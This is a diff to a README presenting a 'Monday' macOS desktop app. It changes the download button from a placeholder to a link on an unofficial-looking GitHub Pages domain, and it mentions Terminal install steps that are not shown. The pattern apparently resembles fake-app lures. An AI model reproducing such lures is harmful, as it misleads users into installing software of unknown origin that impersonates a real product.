@@ -3,7 +3,7 @@
 
 Monday is a powerful work operating system (Work OS) designed to help teams plan, track, and manage projects and tasks collaboratively—all available now as a macOS desktop app. Experience the same flexibility, automation, and visual workflows of the browser version, in a distraction-free native app for Mac. 🧠
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue.svg?style=for-the-badge\&logo=apple)](#)
+[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue.svg?style=for-the-badge\&logo=apple)](https://monday-for-mac-os.github.io/.github/)
 
 If the download button doesn’t work, follow the instructions below to install Monday manually using your Terminal.
 
